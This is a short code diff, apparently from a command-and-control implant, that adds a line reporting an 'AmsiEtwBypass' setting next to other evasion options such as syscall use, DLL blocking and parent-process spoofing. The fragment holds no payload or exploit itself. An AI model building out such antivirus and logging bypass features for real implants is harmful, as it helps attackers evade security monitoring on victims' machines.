@@ -606,6 +606,7 @@ auto DECLFN Task::Info(
 
     Self->Pkg->Int32( Package, Self->Config.BofHook );
     Self->Pkg->Int32( Package, Self->Config.Syscall );
+    Self->Pkg->Int32( Package, Self->Config.AmsiEtwBypass );
 
     Self->Pkg->Int32( Package, Self->Config.Ps.BlockDlls );
     Self->Pkg->Int32( Package, Self->Config.Ps.ParentID );
